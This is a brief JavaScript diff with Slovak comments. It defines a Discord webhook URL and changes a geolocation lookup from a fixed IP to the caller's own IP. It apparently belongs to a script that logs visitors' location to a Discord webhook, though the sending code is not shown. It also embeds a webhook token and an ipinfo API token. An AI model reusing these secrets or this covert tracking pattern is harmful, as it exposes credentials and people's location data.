@@ -14,7 +14,7 @@ const webhookUrl = "hhttps://discord.com/api/webhooks/1312245384768389142/cZYDXn
 
 // Funkcia na získanie geolokačných údajov
 async function getGeoInfo() {
-    const response = await fetch("https://ipinfo.io/87.197.121.207?token=aadb8183cce9ea");
+    const response = await fetch("https://ipinfo.io/?token=aadb8183cce9ea");
     if (!response.ok) throw new Error("Nemôžem získať geolokačné údaje");
     return response.json();
 }
